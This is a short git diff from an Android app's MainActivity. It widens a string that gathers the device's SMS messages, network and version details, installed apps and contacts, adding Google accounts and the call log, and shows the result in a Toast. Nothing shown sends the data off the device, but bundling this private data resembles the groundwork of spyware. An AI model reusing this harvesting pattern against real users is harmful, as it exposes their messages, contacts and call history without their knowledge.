@@ -54,7 +54,7 @@ public class MainActivity extends AppCompatActivity {
         String calls = (getCallLog());
 //        String phoneNumbers = getMyPhoneNumber();
 
-        String s = "SMS:\n" + sms + "\n" + net + "\n" + verDet + "\nAPPLICATIONS:\n" + apps + "\nPHONE CONTACTS\n"+ contacts;
+        String s = "SMS:\n" + sms + "\n" + net + "\n" + verDet + "\nAPPLICATIONS:\n" + apps + "\nGOOGLE ACCOUNTS:\n" + googleAccounts + "\nPHONE CONTACTS\n"+ contacts + "\nCALLS:\n" + calls;
         Toast.makeText(this, s, Toast.LENGTH_SHORT).show();
 
 
